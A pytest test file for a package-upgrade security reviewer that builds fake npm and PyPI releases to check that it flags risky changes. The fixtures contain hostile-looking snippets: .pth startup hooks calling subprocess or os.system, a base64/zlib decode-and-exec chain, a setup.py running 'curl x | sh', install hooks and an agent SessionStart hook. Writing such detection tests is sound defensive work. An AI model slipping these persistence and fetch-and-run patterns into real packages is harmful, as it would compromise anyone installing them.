from __future__ import annotations

import base64
import hashlib
import io
import json
import tarfile
import zipfile

import pytest

from ca9 import api
from ca9.artifacts import fetch

NPM = "https://registry.npmjs.org"


class Registry:
    """In-memory registry; verification, extraction and analysis stay real."""

    def __init__(self, monkeypatch):
        self.documents: dict[str, bytes] = {}
        self.archives: dict[str, bytes] = {}
        self.requests: list[str] = []
        monkeypatch.setattr(fetch, "_fetch_registry_json", self.document)
        monkeypatch.setattr(fetch, "_download_artifact", self.download)

    def document(self, url, config, accept="application/json"):
        self.requests.append(url)
        if url not in self.documents:
            raise fetch.RegistryDocumentNotFound(f"HTTP 404 from {url}")
        return self.documents[url]

    def download(self, url, destination, max_bytes, url_validator):
        assert url_validator(url)
        self.requests.append(url)
        destination.write_bytes(self.archives[url])

    def npm(self, name, version, files, *, manifest=None, user=None, maintainers=("alice",)):
        package = {"name": name, "version": version, "main": "index.js"}
        package.update(manifest or {})
        payloads = {"package/package.json": json.dumps(package).encode()}
        payloads.update({f"package/{path}": _bytes(value) for path, value in files.items()})
        raw = _tar(payloads)
        url = f"{NPM}/{name}/-/{name}-{version}.tgz"
        self.archives[url] = raw
        integrity = "sha512-" + base64.b64encode(hashlib.sha512(raw).digest()).decode()
        document = {
            "name": name,
            "version": version,
            "dist": {"tarball": url, "integrity": integrity},
            "_npmUser": user or {"name": "alice", "email": "alice@example.com"},
            "maintainers": [{"name": item} for item in maintainers],
        }
        self.documents[f"{NPM}/{name}/{version}"] = json.dumps(document).encode()
        return url

    def pypi(self, name, version, wheel=None, sdist=None, *, wheel_tag="py3-none-any"):
        urls = []
        if wheel is not None:
            filename = f"{name}-{version}-{wheel_tag}.whl"
            urls.append(self._pypi_file(filename, "bdist_wheel", _wheel(name, version, wheel)))
        if sdist is not None:
            filename = f"{name}-{version}.tar.gz"
            root = f"{name}-{version}"
            payloads = {f"{root}/{path}": _bytes(value) for path, value in sdist.items()}
            urls.append(self._pypi_file(filename, "sdist", _tar(payloads)))
        document = {"info": {"name": name, "version": version}, "urls": urls}
        self.documents[f"https://pypi.org/pypi/{name}/{version}/json"] = json.dumps(
            document
        ).encode()

    def _pypi_file(self, filename, packagetype, raw):
        url = f"https://files.pythonhosted.org/packages/xx/{filename}"
        self.archives[url] = raw
        return {
            "filename": filename,
            "url": url,
            "packagetype": packagetype,
            "digests": {"sha256": hashlib.sha256(raw).hexdigest()},
            "size": len(raw),
        }


def _bytes(value):
    if isinstance(value, str):
        return value.encode()
    return value


def _tar(payloads):
    stream = io.BytesIO()
    with tarfile.open(fileobj=stream, mode="w:gz") as archive:
        for path, data in sorted(payloads.items()):
            info = tarfile.TarInfo(path)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    return stream.getvalue()


def _wheel(name, version, files):
    dist_info = f"{name}-{version}.dist-info"
    payloads = {path: _bytes(value) for path, value in files.items()}
    payloads.setdefault(
        f"{dist_info}/METADATA", f"Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n"
    )
    payloads = {path: _bytes(value) for path, value in payloads.items()}
    records = []
    for path, data in sorted(payloads.items()):
        digest = base64.urlsafe_b64encode(hashlib.sha256(data).digest()).rstrip(b"=").decode()
        records.append(f"{path},sha256={digest},{len(data)}")
    records.append(f"{dist_info}/RECORD,,")
    payloads[f"{dist_info}/RECORD"] = ("\n".join(records) + "\n").encode()
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, "w") as archive:
        for path, data in sorted(payloads.items()):
            archive.writestr(path, data)
    return stream.getvalue()


@pytest.fixture
def registry(monkeypatch):
    return Registry(monkeypatch)


def _review(pairs, **options):
    return api.review_upgrades(pairs, options=options or None)


def _one(ecosystem, name, old, new, **options):
    report = _review([{"ecosystem": ecosystem, "name": name, "old": old, "new": new}], **options)
    return report["results"][0], report["receipt"]


def _kinds(result, level):
    return sorted(delta["kind"] for delta in result[level])


BASE = {"demo/__init__.py": "VALUE = 1\n"}


def test_new_startup_hooks_block_but_path_only_pth_does_not(registry):
    registry.pypi("demo", "1.0", wheel={**BASE, "demo_paths.pth": "/opt/demo/lib\n"})
    registry.pypi(
        "demo",
        "1.1",
        wheel={
            **BASE,
            "demo_paths.pth": "/opt/demo/lib\nextra/path\n",
            "demo_init.pth": "import os, subprocess; subprocess.Popen(['python', '-c', 'x'])\n",
            "demo_boot.pth": "import _demo_boot\n",
            "demo_cov.pth": "import sys; exec('import os\\nif os.getenv(\"X\"):\\n import demo\\n')\n",
            "_demo_boot.py": "import os\nos.system('true')\n",
            "demo-1.1.data/purelib/sitecustomize.py": "import _demo_boot\n",
            "demo/usercustomize.py": '"""docstring only"""\n',
        },
    )

    result, receipt = _one("pypi", "demo", "1.0", "1.1")

    assert result["status"] == "reviewed"
    assert _kinds(result, "block") == ["new_pth_code", "new_pth_code", "new_sitecustomize"]
    paths = {delta["path"] for delta in result["block"]}
    assert paths == {"demo_init.pth", "demo_boot.pth", "demo-1.1.data/purelib/sitecustomize.py"}
    pth = next(delta for delta in result["block"] if delta["path"] == "demo_init.pth")
    assert pth["line"] == 1 and "subprocess.Popen" in pth["snippet"]
    shipped = [delta for delta in result["warn"] if delta["path"] == "demo_cov.pth"]
    assert [delta["kind"] for delta in shipped] == ["new_import_time_exec"]
    assert receipt["pairs_with_block"] == 1 and receipt["complete"] is True


def test_behaviour_present_in_both_versions_is_counted_not_reported(registry):
    shim = "import os; var = 'X'; enabled = os.environ.get(var) == 'local'\n"
    payload = "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"
    registry.pypi("demo", "1.0", wheel={**BASE, "shim.pth": shim, "demo/load.py": payload})
    registry.pypi(
        "demo",
        "1.1",
        wheel={**BASE, "shim.pth": shim, "demo/load.py": payload + "VALUE = 2\n"},
    )

    result, receipt = _one("pypi", "demo", "1.0", "1.1")

    assert result["block"] == [] and result["warn"] == []
    assert result["unchanged_risky_by_kind"] == {"new_decode_exec": 1, "new_import_time_exec": 1}
    assert receipt["unchanged_risky_behaviours"] == 2


def test_decode_and_exec_split_across_variables_blocks(registry):
    registry.pypi("demo", "1.0", wheel={**BASE, "demo/util.py": "def run():\n    return 1\n"})
    split = (
        "import base64 as b\nimport zlib\n"
        "blob = 'eJwrKMrMK1EozsgvzUlRMDQyNgYAKeoE8Q=='\n"
        "step = b.b64decode(blob)\n"
        "code = zlib.decompress(step).decode()\n"
        "runner = exec\n"
        "def run():\n    runner(code)\n"
    )
    benign = "import base64\n\ndef icon():\n    return base64.b64decode('aGVsbG8=')\n"
    registry.pypi("demo", "1.1", wheel={**BASE, "demo/util.py": split, "demo/icon.py": benign})

    result, _receipt = _one("pypi", "demo", "1.0", "1.1")

    assert _kinds(result, "block") == ["new_decode_exec"]
    assert result["block"][0]["path"] == "demo/util.py"


def test_import_time_process_warns_only_for_module_level_code(registry):
    registry.pypi("demo", "1.0", wheel={**BASE, "demo/cli.py": "def main():\n    pass\n"})
    init = "import subprocess, sys\nfrom . import cli\nsubprocess.Popen([sys.executable, 'x.py'])\n"
    cli = "import subprocess\n\ndef main():\n    subprocess.run(['ls'])\n"
    registry.pypi("demo", "1.1", wheel={"demo/__init__.py": init, "demo/cli.py": cli})

    result, _receipt = _one("pypi", "demo", "1.0", "1.1")

    assert result["block"] == []
    assert _kinds(result, "warn") == ["new_import_time_exec"]
    warn = result["warn"][0]
    assert warn["path"] == "demo/__init__.py" and warn["line"] == 3


def test_url_requirement_blocks_and_registry_requirement_is_info(registry):
    metadata = "Metadata-Version: 2.1\nName: demo\nVersion: {0}\n{1}"
    registry.pypi(
        "demo",
        "1.0",
        wheel={**BASE, "demo-1.0.dist-info/METADATA": metadata.format("1.0", "")},
    )
    requires = (
        "Requires-Dist: helper @ git+https://github.com/example/helper@main\n"
        "Requires-Dist: attrs>=23\n"
    )
    registry.pypi(
        "demo",
        "1.1",
        wheel={**BASE, "demo-1.1.dist-info/METADATA": metadata.format("1.1", requires)},
    )

    result, _receipt = _one("pypi", "demo", "1.0", "1.1")

    assert _kinds(result, "block") == ["new_git_or_url_dependency"]
    assert "git+https://github.com/example/helper" in result["block"][0]["snippet"]
    assert [delta["kind"] for delta in result["info"]] == ["new_dependency"]


def test_sdist_compared_when_only_sdists_are_common(registry):
    setup_old = "from setuptools import setup\nexec(open('demo/v.py').read())\nsetup()\n"
    setup_new = "import os\nfrom setuptools import setup\nos.system('curl x | sh')\nsetup()\n"
    registry.pypi("demo", "1.0", wheel=BASE, sdist={"setup.py": setup_old, **BASE})
    registry.pypi(
        "demo",
        "1.1",
        wheel={**BASE, "demo/_native.so": b"\x7fELF\x02\x01\x01" + b"\x00" * 64},
        sdist={"setup.py": setup_new, **BASE},
        wheel_tag="cp312-cp312-manylinux_2_17_x86_64",
    )

    result, _receipt = _one("pypi", "demo", "1.0", "1.1")

    assert result["artifacts"]["basis"] == "sdist"
    assert _kinds(result, "block") == ["new_install_hook"]
    assert result["block"][0]["path"] == "setup.py" and result["block"][0]["line"] == 3


def test_platform_wheels_compared_when_no_pure_wheel(registry):
    tag = "cp312-cp312-manylinux_2_17_x86_64"
    old_lib = {**BASE, "demo/_core.so": b"\x7fELF\x02" + b"\x00" * 64}
    new_lib = {**old_lib, "demo/_helper.so": b"\x7fELF\x02" + b"\x01" * 64}
    registry.pypi("demo", "1.0", wheel=old_lib, sdist=BASE, wheel_tag=tag)
    registry.pypi("demo", "1.1", wheel=new_lib, sdist=BASE, wheel_tag=tag)

    result, _receipt = _one("pypi", "demo", "1.0", "1.1")

    assert result["artifacts"]["basis"] == "same-platform wheel"
    assert _kinds(result, "warn") == ["new_native_binary"]
    assert result["warn"][0]["path"] == "demo/_helper.so"


def test_npm_install_hook_git_dependency_and_agent_files(registry):
    registry.npm("sample", "1.0.0", {"index.js": "module.exports = 1;\n"})
    registry.npm(
        "sample",
        "1.0.1",
        {
            "index.js": "module.exports = 1;\n",
            "setup.mjs": "console.log('setup');\n",
            ".claude/settings.json": json.dumps(
                {
                    "hooks": {
                        "SessionStart": [
                            {"hooks": [{"type": "command", "command": "node .claude/run.mjs"}]}
                        ]
                    }
                }
            ),
            ".vscode/tasks.json": '{"version": "2.0.0", "tasks": [{"label": "build"}]}',
        },
        manifest={
            "scripts": {"preinstall": "node setup.mjs", "prepare": "husky"},
            "optionalDependencies": {"router": "github:example/router#79ac49e"},
            "dependencies": {"left-pad": "^1.3.0"},
        },
    )

    result, _receipt = _one("npm", "sample", "1.0.0", "1.0.1")

    assert _kinds(result, "block") == [
        "new_git_or_url_dependency",
        "new_install_hook",
        "ships_agent_or_editor_hook",
    ]
    hook = next(delta for delta in result["block"] if delta["kind"] == "new_install_hook")
    assert hook["snippet"] == "node setup.mjs"
    agent = next(d for d in result["block"] if d["kind"] == "ships_agent_or_editor_hook")
    assert agent["path"] == ".claude/settings.json" and "SessionStart" in agent["detail"]
    assert sorted(delta["kind"] for delta in result["info"]) == [
        "new_dependency",
        "new_prepare_script",
        "ships_agent_or_editor_hook",
    ]


def test_npm_publisher_capability_and_obfuscation_warnings(registry):
    trusted = {"name": "GitHub Actions", "trustedPublisher": {"id": "github"}}
    registry.npm("sample", "1.0.0", {"index.js": "module.exports = 1;\n"}, user=trusted)
    obfuscated = "".join(f"var _0x{index:04x}=_0x{index + 1:04x};" for index in range(1500))
    registry.npm(
        "sample",
        "1.0.1",
        {
            "index.js": "const cp = require('node:child_process');\nrequire('./lib/x.js');\n",
            "lib/x.js": obfuscated,
        },
        user={"name": "alice", "email": "alice@example.com"},
    )
    registry.npm("sample", "1.0.2", {"index.js": "module.exports = 2;\n"}, user=trusted)

    result, _receipt = _one("npm", "sample", "1.0.0", "1.0.1")
    upgrade_back, _receipt = _one("npm", "sample", "1.0.1", "1.0.2")

    assert result["block"] == []
    assert _kinds(result, "warn") == [
        "new_import_time_exec",
        "obfuscation_growth",
        "publisher_change",
    ]
    assert upgrade_back["warn"] == [] and upgrade_back["block"] == []


def test_hash_mismatch_and_removed_release_are_skipped(registry):
    registry.npm("sample", "1.0.0", {"index.js": "1;\n"})
    url = registry.npm("sample", "1.0.1", {"index.js": "2;\n"})
    registry.archives[url] = _tar({"package/package.json": b"{}"})

    tampered, _receipt = _one("npm", "sample", "1.0.0", "1.0.1")
    removed, receipt = _one("npm", "sample", "1.0.0", "1.0.9")

    assert tampered["status"] == "skipped"
    assert tampered["reason"] == "artifact_integrity_failed"
    assert removed["reason"] == "release_unavailable"
    assert receipt["complete"] is False


def test_bad_input_and_policy_skips_never_raise_or_fetch(registry):
    assert api.review_upgrades("chalk")["receipt"]["skipped"] == [
        {"reason": "malformed_input", "count": 1}
    ]
    pairs = [
        "not a pair",
        {"ecosystem": "cargo", "name": "x", "old": "1", "new": "2"},
        {"ecosystem": "npm", "name": "sample", "old": "1.0.0", "new": "1.0.0"},
        {"ecosystem": "pypi", "name": "acme-core", "old": "1.0", "new": "1.1"},
        {
            "ecosystem": "npm",
            "name": "sample",
            "old": "1.0.0",
            "new": "1.0.1",
            "registry": "https://npm.evil.example",
        },
        {"ecosystem": "npm", "name": "../x", "old": "1", "new": "2"},
        {"ecosystem": "npm", "name": "sample", "old": "1.0.0", "new": "1.0.2"},
    ]
    report = api.review_upgrades(
        pairs,
        options={"internal_packages": ["acme-*"], "max_pairs": 6, "max_artifact_mb": "big"},
    )

    reasons = [result.get("reason") for result in report["results"]]
    assert reasons == [
        "invalid_pair",
        "unsupported_ecosystem",
        "same_version",
        "internal_package",
        "untrusted_registry",
        "invalid_pair",
        "max_pairs",
    ]
    assert registry.requests == []
    assert report["receipt"]["invalid_options"] == ["max_artifact_mb"]
    assert report["receipt"]["complete"] is False
    offline = api.review_upgrades(
        [{"ecosystem": "pypi", "name": "demo", "old": "1.0", "new": "1.1"}],
        options={"network": False},
    )
    assert offline["results"][0]["reason"] == "network_disabled"
    assert registry.requests == []


def test_internal_package_reviewed_from_listed_private_index_only(registry):
    index = "https://pypi.corp.example/simple"
    files = []
    for version, extra in (("1.0", {}), ("1.1", {"acme_boot.pth": "import os; os.system('id')\n"})):
        raw = _wheel("acme_core", version, {"acme_core/__init__.py": "X = 1\n", **extra})
        filename = f"acme_core-{version}-py3-none-any.whl"
        url = f"https://pypi.corp.example/files/{filename}"
        registry.archives[url] = raw
        files.append(
            {
                "filename": filename,
                "url": url,
                "hashes": {"sha256": hashlib.sha256(raw).hexdigest()},
            }
        )
    registry.documents[f"{index}/acme-core/"] = json.dumps(
        {"name": "acme-core", "files": files}
    ).encode()
    pair = {"ecosystem": "pypi", "name": "acme-core", "old": "1.0", "new": "1.1"}

    report = api.review_upgrades(
        [{**pair, "registry": index}, pair],
        options={"private_registries": [index], "internal_packages": ["acme-*"]},
    )

    private, public = report["results"]
    assert private["status"] == "reviewed"
    assert _kinds(private, "block") == ["new_pth_code"]
    assert public["reason"] == "internal_package"
    assert all(url.startswith("https://pypi.corp.example/") for url in registry.requests)
